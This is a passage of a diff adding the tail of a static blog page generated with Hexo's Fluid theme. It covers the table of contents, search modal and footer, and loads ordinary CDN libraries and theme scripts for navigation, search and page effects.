+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
